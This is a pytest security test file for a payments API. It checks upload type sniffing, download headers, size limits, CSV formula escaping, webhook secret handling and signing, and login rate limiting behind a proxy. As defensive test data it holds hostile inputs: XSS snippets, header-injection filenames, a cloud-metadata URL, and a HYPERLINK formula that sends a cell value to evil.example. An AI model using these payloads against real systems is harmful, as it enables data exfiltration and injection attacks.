"""HTTP-level tests — uploads, CSV export, webhook secrets/signing, rate-limit buckets."""

import csv
import hashlib
import hmac
import io
import json
import uuid

import pytest
from httpx import ASGITransport, AsyncClient

from app.core.config import get_settings
from app.core.database import get_db
from app.main import app

API = "/api/v1"
PNG = b"\x89PNG\r\n\x1a\n" + b"body"
JPEG = b"\xff\xd8\xff\xe0" + b"body"
PDF = b"%PDF-1.7\n" + b"body"
WEBP = b"RIFF\x00\x00\x00\x00WEBPVP8 "


async def _account(c, **kw):
    payload = {
        "account_name": "Acc",
        "borrow_amount": "1000.00",
        "rate": "0.05",
        "cycle": 15,
        "start_date": "2026-01-01",
        **kw,
    }
    r = await c.post(f"{API}/accounts", json=payload)
    assert r.status_code == 201, r.text
    return r.json()


async def _payment(c, account_id):
    r = await c.post(
        f"{API}/accounts/{account_id}/payments",
        json={"amount": "50.00", "payment_date": "2026-01-15", "method": "manual"},
    )
    assert r.status_code == 201, r.text
    return r.json()["id"]


def _att_url(a, p):
    return f"{API}/accounts/{a}/payments/{p}/attachments"


async def _upload(c, a, p, name, data, ctype="application/octet-stream"):
    return await c.post(_att_url(a, p), files={"file": (name, io.BytesIO(data), ctype)})


@pytest.fixture
async def pay(admin_client):
    acc = await _account(admin_client)
    return acc["id"], await _payment(admin_client, acc["id"])


class TestMagicBytes:
    @pytest.mark.parametrize(
        "data,expected",
        [(PNG, "image/png"), (JPEG, "image/jpeg"), (PDF, "application/pdf"), (WEBP, "image/webp")],
    )
    async def test_genuine_files_accepted_and_typed_by_content(
        self, admin_client, pay, data, expected
    ):
        r = await _upload(admin_client, *pay, "scan", data, "application/octet-stream")
        assert r.status_code == 201, r.text
        assert r.json()["content_type"] == expected

    async def test_declared_type_is_ignored_in_favour_of_the_bytes(self, admin_client, pay):
        r = await _upload(admin_client, *pay, "x.png", JPEG, "image/png")
        assert r.status_code == 201 and r.json()["content_type"] == "image/jpeg"

    @pytest.mark.parametrize(
        "name,data,ctype",
        [
            ("receipt.png", b"<html><script>alert(1)</script></html>", "image/png"),
            ("receipt.pdf", b"<svg onload=alert(1)>", "application/pdf"),
            ("r.jpg", b"MZ\x90\x00 pretend exe", "image/jpeg"),
            ("r.png", b"GIF89a....", "image/png"),
            ("r.png", b"\x89PNG", "image/png"),  # truncated signature
        ],
    )
    async def test_wrong_content_is_rejected_whatever_it_claims(
        self, admin_client, pay, name, data, ctype
    ):
        r = await _upload(admin_client, *pay, name, data, ctype)
        assert r.status_code == 415, r.text

    async def test_empty_file(self, admin_client, pay):
        assert (await _upload(admin_client, *pay, "e.png", b"", "image/png")).status_code == 400


class TestDownloadHeaders:
    async def test_download_is_an_attachment_with_a_safe_name_and_locked_down(
        self, admin_client, pay
    ):
        up = await _upload(
            admin_client, *pay, '../../x";\r\nSet-Cookie: pwn=1.png', PNG, "image/png"
        )
        assert up.status_code == 201
        assert (
            up.json()["original_filename"] == "xSet-Cookie: pwn=1.png"
            or "/" not in up.json()["original_filename"]
        )

        r = await admin_client.get(f"{_att_url(*pay)}/{up.json()['id']}")
        assert r.status_code == 200 and r.content == PNG
        cd = r.headers["content-disposition"]
        assert cd.startswith("attachment;") and "\r" not in cd and "\n" not in cd
        assert "pwn=1" not in r.headers.get("set-cookie", "")
        assert r.headers["x-content-type-options"] == "nosniff"
        assert "sandbox" in r.headers["content-security-policy"]

    async def test_unicode_filename_does_not_crash_the_download(self, admin_client, pay):
        up = await _upload(admin_client, *pay, "recibo ñandú ✓.pdf", PDF)
        r = await admin_client.get(f"{_att_url(*pay)}/{up.json()['id']}")
        assert r.status_code == 200
        assert "filename*=UTF-8''" in r.headers["content-disposition"]


class TestSizeCap:
    async def test_declared_oversize_is_refused_before_reading(self, admin_client, pay):
        big = PNG + b"0" * (10 * 1024 * 1024 + 200_000)
        r = await _upload(admin_client, *pay, "big.png", big, "image/png")
        assert r.status_code == 413

    async def test_at_the_limit_is_accepted(self, admin_client, pay):
        ok = PNG + b"0" * (10 * 1024 * 1024 - len(PNG))
        r = await _upload(admin_client, *pay, "ok.png", ok, "image/png")
        assert r.status_code == 201, r.text[:200]

    async def test_chunked_upload_without_content_length_is_cut_off_early(self, admin_client, pay):
        """No Content-Length to trust: the cap has to bite while the body streams in."""
        boundary = "xyzBOUNDARY"
        sent = 0
        total_offered = 60 * 1024 * 1024

        async def body():
            nonlocal sent
            head = (
                f'--{boundary}\r\nContent-Disposition: form-data; name="file"; filename="a.png"\r\n'
                "Content-Type: image/png\r\n\r\n"
            ).encode()
            yield head + PNG
            chunk = b"0" * 65536
            while sent < total_offered:
                sent += len(chunk)
                yield chunk
            yield f"\r\n--{boundary}--\r\n".encode()

        r = await admin_client.post(
            _att_url(*pay),
            content=body(),
            headers={"content-type": f"multipart/form-data; boundary={boundary}"},
        )
        assert r.status_code == 413
        assert "content-length" not in r.request.headers  # it really was chunked
        assert sent < 20 * 1024 * 1024, f"server kept reading: {sent} of {total_offered}"

    async def test_413_still_carries_security_headers(self, admin_client, pay):
        big = PNG + b"0" * (11 * 1024 * 1024)
        r = await _upload(admin_client, *pay, "big.png", big, "image/png")
        assert r.status_code == 413 and r.headers["x-content-type-options"] == "nosniff"

    async def test_other_endpoints_are_not_capped_by_the_upload_rule(self, admin_client):
        r = await admin_client.post(
            f"{API}/accounts", json={"account_name": "x" * 2000, "borrow_amount": "1"}
        )
        assert r.status_code in (201, 422)  # validation outcome, never a 413

    async def test_import_preview_has_its_own_cap(self, admin_client):
        big = b"Referencia,Fecha\n" + b"1,2\n" * (2 * 1024 * 1024)  # ~8 MB
        r = await admin_client.post(
            f"{API}/admin/imports/preview", files={"file": ("l.csv", io.BytesIO(big), "text/csv")}
        )
        assert r.status_code == 413


FORMULA = '=HYPERLINK("http://evil.example/?"&A1,"click")'


def _cells(text):
    return [cell for row in csv.reader(io.StringIO(text)) for cell in row]


class TestCsvExport:
    async def _setup(self, admin_client, name=FORMULA):
        acc = await _account(admin_client, account_name=name)
        await _payment(admin_client, acc["id"])
        return acc

    async def test_no_exported_cell_can_start_a_formula(self, admin_client):
        acc = await self._setup(admin_client)
        for url in (
            f"{API}/admin/export/accounts.csv",
            f"{API}/admin/export/payments.csv",
            f"{API}/admin/export/accounts/{acc['id']}/full.csv",
        ):
            r = await admin_client.get(url)
            assert r.status_code == 200, url
            dangerous = [
                c
                for c in _cells(r.text)
                if c.startswith(("=", "+", "@", "\t", "\r"))
                or (c.startswith("-") and not c.lstrip("-").replace(".", "", 1).isdigit())
            ]
            assert dangerous == [], (url, dangerous)
        full = (await admin_client.get(f"{API}/admin/export/accounts/{acc['id']}/full.csv")).text
        assert "'" + FORMULA in _cells(full)

    async def test_numbers_are_not_mangled(self, admin_client):
        acc = await self._setup(admin_client, name="Plain")
        full = (await admin_client.get(f"{API}/admin/export/accounts/{acc['id']}/full.csv")).text
        assert (
            "1000.00" in _cells(full)
            or "1000.0000" in _cells(full)
            or any(c.startswith("1000") for c in _cells(full))
        )

    async def test_filename_header_is_safe_for_hostile_account_names(self, admin_client):
        acc = await self._setup(admin_client, name='évil"; filename="x.exe\r\nX-Pwn: 1 ñ ✓')
        r = await admin_client.get(f"{API}/admin/export/accounts/{acc['id']}/full.csv")
        assert r.status_code == 200
        cd = r.headers["content-disposition"]
        assert cd.startswith("attachment;") and "X-Pwn" not in r.headers and "\n" not in cd

    async def test_round_trip_restores_the_original_name(self, admin_client):
        acc = await self._setup(admin_client)
        exported = (
            await admin_client.get(f"{API}/admin/export/accounts/{acc['id']}/full.csv")
        ).text
        r = await admin_client.post(
            f"{API}/admin/imports/preview",
            files={"file": ("full.csv", io.BytesIO(exported.encode()), "text/csv")},
        )
        assert r.status_code in (200, 201), r.text
        assert r.json()["accounts"][0]["suggested_account_name"] == FORMULA


class TestWebhookSecrets:
    @pytest.fixture(autouse=True)
    def _public(self, monkeypatch):
        async def ok(url):
            return None

        monkeypatch.setattr("app.modules.webhooks.service.avalidate_outbound_url", ok)
        monkeypatch.setattr("app.modules.admin.router.avalidate_outbound_url", ok)

    BODY = {"target_url": "https://example.com/hook", "events": ["payment.added"]}

    async def test_account_webhook_secret_shown_once_on_create_only(self, admin_client):
        acc = await _account(admin_client)
        base = f"{API}/accounts/{acc['id']}/webhooks"
        created = await admin_client.post(base, json=self.BODY)
        assert created.status_code == 201
        secret = created.json()["secret"]
        assert secret.startswith("whsec_") and len(secret) >= 40

        listing = await admin_client.get(base)
        assert "secret" not in listing.text and secret not in listing.text

    async def test_global_webhook_secret_shown_once_on_create_only(self, admin_client):
        created = await admin_client.post(f"{API}/admin/webhooks", json=self.BODY)
        assert created.status_code == 201 and created.json()["secret"].startswith("whsec_")
        listing = await admin_client.get(f"{API}/admin/webhooks")
        assert "secret" not in listing.text

    async def test_the_shown_secret_is_the_one_that_signs(self, admin_client, db):
        from app.modules.webhooks.models import WebhookConfig

        created = (await admin_client.post(f"{API}/admin/webhooks", json=self.BODY)).json()
        row = await db.get(WebhookConfig, uuid.UUID(created["id"]))
        assert row.secret_hash == created["secret"]

    async def test_rotate_issues_a_new_secret(self, admin_client, db):
        from app.modules.webhooks.models import WebhookConfig

        acc = await _account(admin_client)
        base = f"{API}/accounts/{acc['id']}/webhooks"
        first = (await admin_client.post(base, json=self.BODY)).json()
        rot = await admin_client.post(f"{base}/{first['id']}/rotate-secret")
        assert rot.status_code == 200 and rot.json()["secret"] != first["secret"]
        row = await db.get(WebhookConfig, uuid.UUID(first["id"]))
        await db.refresh(row)
        assert row.secret_hash == rot.json()["secret"]

    async def test_rotate_is_scoped_to_the_account_in_the_url(self, admin_client):
        a, b = await _account(admin_client), await _account(admin_client, account_name="B")
        wh = (await admin_client.post(f"{API}/accounts/{a['id']}/webhooks", json=self.BODY)).json()
        r = await admin_client.post(f"{API}/accounts/{b['id']}/webhooks/{wh['id']}/rotate-secret")
        assert r.status_code == 404
        g = (await admin_client.post(f"{API}/admin/webhooks", json=self.BODY)).json()
        r = await admin_client.post(f"{API}/accounts/{a['id']}/webhooks/{g['id']}/rotate-secret")
        assert r.status_code == 404

    async def test_non_admin_cannot_rotate(self, user_client, admin_client):
        g = (await admin_client.post(f"{API}/admin/webhooks", json=self.BODY)).json()
        assert (
            await user_client.post(f"{API}/admin/webhooks/{g['id']}/rotate-secret")
        ).status_code == 403

    @pytest.mark.parametrize(
        "body",
        [
            {},
            {"is_active": "banana"},
            {"is_active": True, "target_url": "http://169.254.169.254"},
            {"secret_hash": "x"},
        ],
    )
    async def test_toggle_takes_a_strict_body(self, admin_client, body):
        g = (await admin_client.post(f"{API}/admin/webhooks", json=self.BODY)).json()
        r = await admin_client.patch(f"{API}/admin/webhooks/{g['id']}", json=body)
        assert r.status_code == 422

    async def test_toggle_works(self, admin_client):
        g = (await admin_client.post(f"{API}/admin/webhooks", json=self.BODY)).json()
        r = await admin_client.patch(f"{API}/admin/webhooks/{g['id']}", json={"is_active": False})
        assert r.status_code == 200 and r.json()["is_active"] is False and "secret" not in r.json()


class TestWebhookSignature:
    async def test_signature_verifies_against_the_raw_request_body(
        self, admin_client, db, monkeypatch
    ):
        """What a receiver does: HMAC the bytes it got with the secret it was shown."""
        from app.modules.webhooks.models import WebhookEvent
        from app.modules.webhooks.service import WebhookDeliveryService

        async def ok(url):
            return None

        monkeypatch.setattr("app.modules.webhooks.service.avalidate_outbound_url", ok)
        monkeypatch.setattr("app.modules.admin.router.avalidate_outbound_url", ok)
        created = (
            await admin_client.post(
                f"{API}/admin/webhooks",
                json={"target_url": "https://example.com/h", "events": ["payment.added"]},
            )
        ).json()
        # Deliberately unsorted keys, unicode and a decimal-ish string: the old code signed a
        # sorted dump but let the HTTP client emit different bytes.
        payload = {"zeta": 1, "alpha": "ñ", "nested": {"b": 2, "a": [3, 1]}, "amt": "10.50"}
        ev = WebhookEvent(
            webhook_id=uuid.UUID(created["id"]), event_type="payment.added", payload=payload
        )
        db.add(ev)
        await db.flush()

        seen = {}

        class Capture:
            async def post(self, url, content=None, headers=None, **kw):
                assert "json" not in kw, "must send the exact bytes that were signed"
                seen.update(content=content, headers=headers)

                class R:
                    is_success = True

                return R()

        await WebhookDeliveryService(db)._deliver(Capture(), ev)

        expected = hmac.new(created["secret"].encode(), seen["content"], hashlib.sha256).hexdigest()
        assert seen["headers"]["X-Webhook-Signature"] == expected
        assert json.loads(seen["content"]) == payload
        assert seen["headers"]["X-Webhook-Id"] == str(ev.id)
        assert ev.status == "delivered"


class TestLoginRateLimitPerClient:
    @pytest.fixture
    async def via_proxy(self, db, monkeypatch):
        """Requests arriving from nginx (172.28.0.9) on behalf of different clients."""
        monkeypatch.setattr(get_settings(), "TRUSTED_PROXIES", ["172.28.0.0/16"])

        async def _db():
            yield db

        app.dependency_overrides[get_db] = _db
        async with AsyncClient(
            transport=ASGITransport(app=app, client=("172.28.0.9", 5555)), base_url="http://test"
        ) as c:
            yield c
        app.dependency_overrides.pop(get_db, None)

    async def _fail(self, c, xff, n):
        bad = {"email": "nobody@test.dev", "password": "wrong-password"}
        return [
            (
                await c.post(f"{API}/auth/login", json=bad, headers={"X-Forwarded-For": xff})
            ).status_code
            for _ in range(n)
        ]

    async def test_one_noisy_client_does_not_lock_out_everyone_else(self, via_proxy):
        limit = get_settings().AUTH_RATE_LIMIT_PER_MINUTE
        noisy = await self._fail(via_proxy, "203.0.113.1", limit + 2)
        assert noisy[-1] == 429
        # A different real client behind the same proxy still gets its own attempts.
        assert await self._fail(via_proxy, "203.0.113.2", 1) == [401]

    async def test_spoofing_the_header_does_not_buy_extra_attempts(self, via_proxy):
        limit = get_settings().AUTH_RATE_LIMIT_PER_MINUTE
        # nginx appends the true address; the client's own prefix changes every request.
        codes = []
        for i in range(limit + 2):
            codes += await self._fail(via_proxy, f"10.9.9.{i}, 203.0.113.50", 1)
        assert codes[-1] == 429

    async def test_without_trusted_proxies_everyone_behind_the_proxy_shares_a_bucket(
        self, db, monkeypatch
    ):
        """The default (and the bug being fixed): documents why TRUSTED_PROXIES must be set."""
        monkeypatch.setattr(get_settings(), "TRUSTED_PROXIES", [])

        async def _db():
            yield db

        app.dependency_overrides[get_db] = _db
        async with AsyncClient(
            transport=ASGITransport(app=app, client=("172.28.0.9", 1)), base_url="http://test"
        ) as c:
            limit = get_settings().AUTH_RATE_LIMIT_PER_MINUTE
            await self._fail(c, "203.0.113.1", limit)
            assert await self._fail(c, "203.0.113.2", 1) == [429]
        app.dependency_overrides.pop(get_db, None)
